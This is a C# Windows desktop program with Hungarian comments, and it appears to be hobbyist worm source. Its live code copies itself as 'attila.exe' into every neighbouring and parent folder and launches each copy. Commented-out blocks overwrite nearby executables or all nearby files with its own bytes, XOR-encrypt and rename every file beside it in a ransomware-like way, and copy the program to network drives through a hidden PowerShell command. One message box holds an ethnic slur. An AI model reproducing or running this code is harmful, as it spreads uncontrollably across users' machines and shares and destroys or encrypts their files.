using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.IO;
using System.Diagnostics;
using System.Reflection;
using System.Windows.Threading;
using System.Management;
using System.Text.RegularExpressions;


namespace regina
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        int asd = 0;
        public MainWindow()
        {
            DispatcherTimer timer = new DispatcherTimer();
            timer.Interval = TimeSpan.FromSeconds(3);
            timer.Tick += Timer_Tick;
            timer.Start();
            InitializeComponent();


            string assemblyPath = Assembly.GetExecutingAssembly().Location;//exenek a futo pathja exével
            string exeNamenelkul = System.IO.Path.GetDirectoryName(assemblyPath);//exenek a futo pathja exe nelkul
            Directory.SetCurrentDirectory(exeNamenelkul);//at allitom az exe nelkulre
            string currentDirectory = Directory.GetCurrentDirectory(); //peldanyositomxd
            string[] konyvtarakMellettem = Directory.GetDirectories(currentDirectory); //konyvtarak az aktualis exe mellett
            string szuloKonyvtar = Directory.GetParent(currentDirectory)?.FullName; //szulo konyvtaram, ami mögöttem van
            string exename = System.IO.Path.GetFileName(assemblyPath); //exename
            string attila = "attila.exe";
            bool elsoif = false;
            bool masodikif = false;

            DriveInfo[] allDrives = DriveInfo.GetDrives();
            List<string> elerhetoMeghajtok = new List<string>();

            foreach (DriveInfo meghajto in allDrives)
            {
                if (meghajto.DriveType == DriveType.Network && meghajto.IsReady)
                {
                    elerhetoMeghajtok.Add(meghajto.Name.TrimEnd('\\'));
                }
            }

            foreach (DriveInfo asdasd in allDrives) elerhetoMeghajtok.Add(Convert.ToString(asdasd));

            /*
            //-----------------ezt nem fogom engedélyezni, ez a kód át ír minden exe fájlt maga körül és bemásolja a saját kódját---------------------
            string[] exeFiles = Directory.GetFiles(currentDirectory, "*.exe", SearchOption.TopDirectoryOnly);
            foreach (string exek in exeFiles)
            {
                if (exek != assemblyPath)
                {
                    byte[] newData = File.ReadAllBytes(exename);
                    try
                    {
                        using (FileStream fs = new FileStream(exek, FileMode.Create, FileAccess.Write))
                        {
                            fs.Write(newData, 0, newData.Length);
                        }
                    }
                    catch (Exception asd)
                    {
                        Console.WriteLine(asd);
                    }
                }
            }*/
            
            /*
            //-----------------ezt nem fogom engedélyezni, ez a kód át ír MINDEN fájlt maga körül és bemásolja a saját kódját---------------------
            string[] exeFiles = Directory.GetFiles(currentDirectory, "*.*", SearchOption.TopDirectoryOnly);
            foreach (string exek in exeFiles)
            {
                if (exek != assemblyPath)
                {
                    byte[] newData = File.ReadAllBytes(exename);
                    try
                    {
                        using (FileStream fs = new FileStream(exek, FileMode.Create, FileAccess.Write))
                        {
                            fs.Write(newData, 0, newData.Length);
                        }
                        System.IO.File.Move(exek, System.IO.Path.GetFileNameWithoutExtension(exek)+".exe");
                    }
                    catch (Exception asd)
                    {
                        Console.WriteLine(asd);
                    }
                }
            }*/



            //-----------------minden fajlt encriptol maga mellett---------------------
            /*
            string[] mindenFileok = Directory.GetFiles(currentDirectory, "*.*", SearchOption.TopDirectoryOnly);


            foreach (string Fileok in mindenFileok)
            {
                if (Fileok != assemblyPath)
                {
                    if (System.IO.Path.GetExtension(Fileok).Contains("melegvagy")) continue;
                    string fajl = Fileok;
                    string kulcs = "almafasz";
                    List<Byte> asd = enkriptor(fajl, kulcs);

                    byte[] newData = asd.ToArray();

                    try
                    {
                        using (FileStream fs = new FileStream(fajl, FileMode.Create, FileAccess.Write))
                        {
                            fs.Write(newData, 0, newData.Length);
                        }
                        System.IO.File.Move(fajl, fajl + "melegvagy");
                    }
                    catch (Exception a)
                    {
                        Console.WriteLine(a);
                    }
                }
            }*/







            //------------- előrefele másolás folyamatok------------
            //MessageBox.Show(Convert.ToString(konyvtarakMellettem.Count()));
            if (konyvtarakMellettem.Count() != 0)
            {
                foreach (string asd in konyvtarakMellettem)
                {
                    if (!File.Exists(asd + $"\\{attila}"))
                    {
                        File.Copy(currentDirectory + $"\\{exename}", asd + $"\\{attila}");
                        Process.Start(asd + $"\\{attila}");
                    }
                    else elsoif = true;
                }
            }
            else elsoif = true;

            
            
            //------------- hátrafele másolás folyamatok------------
            if (!File.Exists(szuloKonyvtar + $"\\{attila}"))
            {
                File.Copy($"{currentDirectory}\\{exename}", $"{szuloKonyvtar}\\{attila}");
                Process.Start($"{szuloKonyvtar}\\{attila}");
            }
            else masodikif = true;

            
            
            /*
            //-------------masik meghajtora valo masolas------------
            if ((elsoif == true && masodikif == true) || szuloKonyvtar == currentDirectory)
            {
                foreach (string meghajtok in elerhetoMeghajtok)
                {
                    string uncPath = GetUncPathFromNetUse(meghajtok);

                    MessageBox.Show($"{meghajtok} - {uncPath} - BUDOS CIGANYOK");

                    if (uncPath!=null)
                    {

                        ProcessStartInfo psi = new ProcessStartInfo
                        {
                            FileName = "powershell.exe",
                            Arguments = $"copy {currentDirectory}\\{attila} {uncPath}",
                            RedirectStandardOutput = true,
                            UseShellExecute = false,
                            CreateNoWindow = true
                        };
                        
                        Process powerShellProcess = new Process();
                        powerShellProcess.StartInfo = psi;
                        powerShellProcess.Start();

                        
                        using (Process process = Process.Start(psi))
                        {
                            string output = process.StandardOutput.ReadToEnd();
                            process.WaitForExit();
                            MessageBox.Show(output);

                        }

                    } else if (uncPath == null)
                    {
                        if (!File.Exists($"{meghajtok}\\{attila}"))
                        {
                            try
                            {
                                File.Copy($"{currentDirectory}\\{exename}", $"{meghajtok}\\{attila}");
                                //Process.Start($"{meghajtok}\\{attila}");
                            }
                            catch (Exception ea)
                            {
                                //MessageBox.Show(ea.ToString());
                                Console.WriteLine(ea);
                            }
                        }
                    }


                }
            }*/
            

               //------------- random pozicio a windownak------------ (koszike chat gpt)
            Random rnd = new Random();
            var workingArea = SystemParameters.WorkArea;
            double maxLeft = workingArea.Width - this.Width;
            double maxTop = workingArea.Height - this.Height;
            this.Left = new Random().NextDouble() * maxLeft;
            this.Top = new Random().NextDouble() * maxTop;
            this.Loaded += MainWindow_Loaded;
        }



        static List<Byte> enkriptor(string fajl, string kulcs)
        {
            byte[] fajlBitok = File.ReadAllBytes(fajl);
            List<Byte> enkripted = new List<Byte>();
            byte[] kulcsenkripted = Encoding.UTF8.GetBytes(kulcs);

            //string enkriptedSzoveg = "";

            for (int i = 0; i < fajlBitok.Length; i++)
            {

                byte jelenlegiKulcsByte = kulcsenkripted[i % kulcsenkripted.Length]; //félig meddig chatgpt
                enkripted.Add((byte)(fajlBitok[i] ^ jelenlegiKulcsByte));
            }
            /*
            foreach (byte i in enkripted)
            {
                enkriptedSzoveg += Convert.ToChar(i);
            }*/
            return enkripted;
        }



        static List<Byte> dekriptor(string enkriptedFajl, string kulcs)
        {
            byte[] fajlBitok = File.ReadAllBytes(enkriptedFajl);
            string dekriptedSzoveg = "";
            List<Byte> dekripted = new List<Byte>();
            byte[] kulcsenkripted = Encoding.UTF8.GetBytes(kulcs);


            for (int i = 0; i < fajlBitok.Length; i++)
            {

                byte jelenlegiKulcsByte = kulcsenkripted[i % kulcsenkripted.Length]; //félig meddig chatgpt
                dekripted.Add((byte)(fajlBitok[i] ^ jelenlegiKulcsByte));
            }

            foreach (byte i in dekripted)
            {
                dekriptedSzoveg += Convert.ToChar(i);
            }
            return dekripted;
        }
        private void Timer_Tick(object sender, EventArgs e)
        {
            asd++;
            //if (asd==1) Environment.Exit(0);
            //MessageBox.Show(asd.ToString());
        }
        


        private void MainWindow_Loaded(object sender, RoutedEventArgs e)
        {
            

        }

        static string GetUncPathFromNetUse(string driveLetter)
        {
            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = "net",
                Arguments = "use",
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using (Process process = Process.Start(psi))
            {
                string output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();
                //MessageBox.Show(output);

                // Sorokra bontjuk a kimenetet
                string[] lines = output.Split(new[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);

                foreach (string line in lines)
                {

                    //11db space
                    if (line.StartsWith("OK", StringComparison.OrdinalIgnoreCase))
                    {
                        string[] parts = line.Split(new char[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);

                        
                        if (parts[1] == driveLetter)
                        {
                            MessageBox.Show(parts[2]);
                            return parts[2];
                        }
                        /*
                        if (parts.Length >= 2 && parts[1].StartsWith(@"\\"))
                        {
                            return parts[1];
                        }*/
                    }
                }
            }

            return null;
        }
    }
}
